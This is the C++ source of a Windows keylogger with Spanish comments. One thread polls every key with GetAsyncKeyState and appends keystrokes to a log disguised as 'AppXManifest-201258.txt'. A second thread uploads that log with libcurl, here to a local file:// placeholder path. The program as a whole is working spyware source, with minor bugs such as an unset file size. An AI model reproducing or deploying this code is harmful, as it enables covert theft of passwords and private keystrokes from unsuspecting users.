#include <iostream>
#include <windows.h>
#include <ctime>
#include <thread>
#include <stdio.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <stdlib.h>

//Instalacion de libreria curl para subir archivos a un servidor remoto
#include <curl/curl.h>

using namespace std;


int Save(int _key, char *file)
{
    cout<<_key<<endl;
    Sleep(10);
    FILE *Output_file;
    Output_file = fopen(file, "a+");

    //Uso de VK_KEY pero con codigo hex
    switch(_key)
    {
    case 0x10:
        fprintf_s(Output_file, "[SHFT]");
        break;
    case 0x08:
        fprintf_s(Output_file, "[B-SPACE]");
        break;
    case 0x01:
        fprintf_s(Output_file, "[LBUTTON]");
        break;
    case 0x02:
        fprintf_s(Output_file, "[RBUTTON]");
        break;
    case 0x0D:
        fprintf_s(Output_file, "[ENTER]");
        break;
    case 0x09:
        fprintf_s(Output_file, "[TAB]");
        break;
    case 0x1B: 
        fprintf_s(Output_file, "[ESCAPE]");
        break;
    case 0x11: 
        fprintf_s(Output_file, "[Ctrl]");
        break;
    case 0x12: 
        fprintf_s(Output_file, "[Alt]");
        break;
    case 0x14: 
        fprintf_s(Output_file, "[CAPSLOKC]");
        break;
    case 0x20: 
        fprintf_s(Output_file, "[SPACE]");
        break;
    case 0xBE:
        fprintf_s(Output_file, ".");
        break;
    }
    fprintf_s(Output_file,"%s", &_key);
    fclose(Output_file);
    return 0;
}

void view(){
    char i;
    while(true)
    {
        Sleep(10);
        for(i=8;i<=255; i++){
            if(GetAsyncKeyState(i) == -32767){
                Save(i,"AppXManifest-201258.txt");
            }
        }
    }
}

void up(){
    Sleep(10000);
    //~/ estructra curl con puntero de memoria
    CURL *curl;
    //~/ almacenar codigo de resultados
    CURLcode res;

    //~/ struct stat para obtener info de un archivo
    struct stat file_info;

    //~/ almacena velocidad de subida y tiempo 
    curl_off_t speed_upload, total_time;

    //~/ Archivo y un puntero fd, despues lo abre
    FILE *file;
    file = fopen("AppXManifest-201258.txt", "r+");
    
    //Inicia esttancia curl
    curl = curl_easy_init();

    if(curl) {
        //
        // curl_easy_setopt se inicializa la url de recepcion,
        // se manda la estancia curl, opcion de url, url
        curl_easy_setopt(curl, CURLOPT_URL, "file:///Users/corre");

        // Indicamos a curl que es una subida setopt(curl, opcion(subida), 1L (para indicar que es una subida))
        curl_easy_setopt(curl, CURLOPT_UPLOAD, 1L);
        
        //indicar a curl el puntero de FILE para hacer la carga
        curl_easy_setopt(curl, CURLOPT_READDATA, file);
    
        //indicamos el tamño del archivo obtenido de stat  (file_info)
        curl_easy_setopt(curl, CURLOPT_INFILESIZE_LARGE, (curl_off_t)file_info.st_size);
    
        // Antes declarado es para guardar datos y curl_easy_perform realiza la tarea
        res = curl_easy_perform(curl);

        //Si ocurre un error, informa y libera la memoria
        if(res != CURLE_OK) {
            fprintf(stderr, "curl_easy_perform() failed: %s\n", curl_easy_strerror(res));
        }
        else {
            //Si no hay problemas llamamos a getinfo para que nos muestre los datos de velocidad
            //y tiempo restante para la subida del archivo, todo esto se guarda en las variables
            //de tipo curl_off_t
            curl_easy_getinfo(curl, CURLINFO_SPEED_UPLOAD_T, &speed_upload);
            curl_easy_getinfo(curl, CURLINFO_TOTAL_TIME_T, &total_time);
        
            fprintf(stderr, "Speed: %lu bytes/sec during %lu.%06lu seconds\n",
                    (unsigned long)speed_upload,
                    (unsigned long)(total_time / 1000000),
                    (unsigned long)(total_time % 1000000));
        }
        //Terminamos la instancia
        curl_easy_cleanup(curl);
    }
    fclose(file);
}

int main(void)
{
    //thread th2(&send);
    thread logg(&view); 
    thread upload(&up);
   // th2.join();
    logg.join();
    upload.join();

    return 0;
}